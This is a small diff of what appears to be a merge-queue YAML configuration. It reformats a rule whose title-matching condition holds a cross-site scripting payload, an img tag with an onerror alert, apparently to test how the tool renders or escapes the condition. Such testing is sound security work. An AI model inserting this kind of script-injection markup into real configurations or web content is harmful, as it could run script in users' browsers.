@@ -1,8 +1,8 @@
 queue_rules:
-    - name: default
-      merge_method: merge
-      merge_conditions:
-        - 'title~=<img src=x onerror=alert(document.domain)>'
+  - name: default
+    merge_method: merge
+    merge_conditions:
+      - "title~=x` <img src=x onerror=alert(document.domain)> `y"
 
 pull_request_rules:
   - name: auto queue
